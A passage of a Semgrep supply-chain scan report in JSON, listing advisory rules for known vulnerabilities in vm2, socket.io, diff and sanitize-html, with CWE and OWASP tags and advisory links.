code."},"help":{"markdown":"Affected versions of vm2 are vulnerable to Improper Control of Dynamically-Managed Code Resources / Improper Control of Generation of Code ('Code Injection') / Protection Mechanism Failure. `Promise.prototype.then`, `Promise.prototype.catch` callback sanitization can be bypassed. This allows attackers to escape the sandbox and run arbitrary code.\n\n<b>References:</b>\n - [Semgrep Rule](https://semgrep.dev/orgs/-/supply-chain/advisories?q=ssc-e34c7458-920e-4172-a670-bb83d66253a7)\n - [https://github.com/advisories/GHSA-99p7-6v5w-7xg8](https://github.com/advisories/GHSA-99p7-6v5w-7xg8)\n - [https://nvd.nist.gov/vuln/detail/CVE-2026-22709](https://nvd.nist.gov/vuln/detail/CVE-2026-22709)\n","text":"Affected versions of vm2 are vulnerable to Improper Control of Dynamically-Managed Code Resources / Improper Control of Generation of Code ('Code Injection') / Protection Mechanism Failure. `Promise.prototype.then`, `Promise.prototype.catch` callback sanitization can be bypassed. This allows attackers to escape the sandbox and run arbitrary code."},"helpUri":"https://semgrep.dev/orgs/-/supply-chain/advisories?q=ssc-e34c7458-920e-4172-a670-bb83d66253a7","id":"ssc-e34c7458-920e-4172-a670-bb83d66253a7","name":"ssc-e34c7458-920e-4172-a670-bb83d66253a7","properties":{"precision":"very-high","tags":["CWE-693: Protection Mechanism Failure","CWE-913: Improper Control of Dynamically-Managed Code Resources","CWE-94: Improper Control of Generation of Code ('Code Injection')","HIGH CONFIDENCE","OWASP-A01:2021 - Broken Access Control","OWASP-A01:2025 - Broken Access Control","OWASP-A03:2021 - Injection","OWASP-A05:2025 - Injection","OWASP-A06:2021 - Vulnerable and Outdated Components","security"]},"shortDescription":{"text":"Semgrep Finding: ssc-e34c7458-920e-4172-a670-bb83d66253a7"}},{"defaultConfiguration":{"level":"error"},"fullDescription":{"text":"vm2 versions before 3.9.18 are vulnerable to Improper Neutralization Of Special Elements In Output Used By A Downstream Component ('Injection'). A threat actor can bypass the sandbox protections to gain remote code execution rights on the host running the sandbox."},"help":{"markdown":"vm2 versions before 3.9.18 are vulnerable to Improper Neutralization Of Special Elements In Output Used By A Downstream Component ('Injection'). A threat actor can bypass the sandbox protections to gain remote code execution rights on the host running the sandbox.\n\n<b>References:</b>\n - [Semgrep Rule](https://semgrep.dev/orgs/-/supply-chain/advisories?q=ssc-f313bdfc-0f29-4bfd-8089-baf2817fc586)\n - [https://github.com/advisories/GHSA-whpj-8f3w-67p5](https://github.com/advisories/GHSA-whpj-8f3w-67p5)\n - [https://nvd.nist.gov/vuln/detail/CVE-2023-32314](https://nvd.nist.gov/vuln/detail/CVE-2023-32314)\n","text":"vm2 versions before 3.9.18 are vulnerable to Improper Neutralization Of Special Elements In Output Used By A Downstream Component ('Injection'). A threat actor can bypass the sandbox protections to gain remote code execution rights on the host running the sandbox."},"helpUri":"https://semgrep.dev/orgs/-/supply-chain/advisories?q=ssc-f313bdfc-0f29-4bfd-8089-baf2817fc586","id":"ssc-f313bdfc-0f29-4bfd-8089-baf2817fc586","name":"ssc-f313bdfc-0f29-4bfd-8089-baf2817fc586","properties":{"precision":"very-high","tags":["CWE-74: Improper Neutralization of Special Elements in Output Used by a Downstream Component ('Injection')","HIGH CONFIDENCE","OWASP-A03:2021 - Injection","OWASP-A05:2025 - Injection","OWASP-A06:2021 - Vulnerable and Outdated Components","security"]},"shortDescription":{"text":"Semgrep Finding: ssc-f313bdfc-0f29-4bfd-8089-baf2817fc586"}},{"defaultConfiguration":{"level":"warning"},"fullDescription":{"text":"Affected versions of socket.io are vulnerable to Improper Check for Unusual or Exceptional Conditions / Improper Input Validation. A specially crafted Socket.IO packet can trigger an uncaught exception on the Socket.IO server, thus killing the Node.js process. This is valid if a user has NOT explicitly defined a listener for the `error` event."},"help":{"markdown":"Affected versions of socket.io are vulnerable to Improper Check for Unusual or Exceptional Conditions / Improper Input Validation. A specially crafted Socket.IO packet can trigger an uncaught exception on the Socket.IO server, thus killing the Node.js process. This is valid if a user has NOT explicitly defined a listener for the `error` event.\n\n<b>References:</b>\n - [Semgrep Rule](https://semgrep.dev/orgs/-/supply-chain/advisories?q=ssc-f72bbe54-9f89-99bd-d4d5-e299a184467a)\n - [https://github.com/advisories/GHSA-25hc-qcg6-38wj](https://github.com/advisories/GHSA-25hc-qcg6-38wj)\n - [https://nvd.nist.gov/vuln/detail/CVE-2024-38355](https://nvd.nist.gov/vuln/detail/CVE-2024-38355)\n","text":"Affected versions of socket.io are vulnerable to Improper Check for Unusual or Exceptional Conditions / Improper Input Validation. A specially crafted Socket.IO packet can trigger an uncaught exception on the Socket.IO server, thus killing the Node.js process. This is valid if a user has NOT explicitly defined a listener for the `error` event."},"helpUri":"https://semgrep.dev/orgs/-/supply-chain/advisories?q=ssc-f72bbe54-9f89-99bd-d4d5-e299a184467a","id":"ssc-f72bbe54-9f89-99bd-d4d5-e299a184467a","name":"ssc-f72bbe54-9f89-99bd-d4d5-e299a184467a","properties":{"precision":"very-high","tags":["CWE-20: Improper Input Validation","CWE-754: Improper Check for Unusual or Exceptional Conditions","HIGH CONFIDENCE","OWASP-A03:2021 - Injection","OWASP-A05:2025 - Injection","OWASP-A06:2021 - Vulnerable and Outdated Components","OWASP-A10:2025 - Mishandling of Exceptional Conditions","security"]},"shortDescription":{"text":"Semgrep Finding: ssc-f72bbe54-9f89-99bd-d4d5-e299a184467a"}},{"defaultConfiguration":{"level":"note"},"fullDescription":{"text":"Affected versions of diff are vulnerable to Inefficient Regular Expression Complexity / Uncontrolled Resource Consumption."},"help":{"markdown":"Affected versions of diff are vulnerable to Inefficient Regular Expression Complexity / Uncontrolled Resource Consumption.\n\n<b>References:</b>\n - [Semgrep Rule](https://semgrep.dev/orgs/-/supply-chain/advisories?q=ssc-parity-12b8a75ed474a41eb0ac2bf4c2ae96bb0d0489ba)\n - [https://github.com/advisories/GHSA-73rr-hh4g-fpgx](https://github.com/advisories/GHSA-73rr-hh4g-fpgx)\n - [https://nvd.nist.gov/vuln/detail/CVE-2026-24001](https://nvd.nist.gov/vuln/detail/CVE-2026-24001)\n","text":"Affected versions of diff are vulnerable to Inefficient Regular Expression Complexity / Uncontrolled Resource Consumption."},"helpUri":"https://semgrep.dev/orgs/-/supply-chain/advisories?q=ssc-parity-12b8a75ed474a41eb0ac2bf4c2ae96bb0d0489ba","id":"ssc-parity-12b8a75ed474a41eb0ac2bf4c2ae96bb0d0489ba","name":"ssc-parity-12b8a75ed474a41eb0ac2bf4c2ae96bb0d0489ba","properties":{"precision":"very-high","tags":["CWE-1333: Inefficient Regular Expression Complexity","CWE-400: Uncontrolled Resource Consumption","LOW CONFIDENCE","OWASP-A06:2021 - Vulnerable and Outdated Components","security"]},"shortDescription":{"text":"Semgrep Finding: ssc-parity-12b8a75ed474a41eb0ac2bf4c2ae96bb0d0489ba"}},{"defaultConfiguration":{"level":"warning"},"fullDescription":{"text":"Affected versions of sanitize-html are vulnerable to Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')."},"help":{"markdown":"Affected versions of sanitize-html are vulne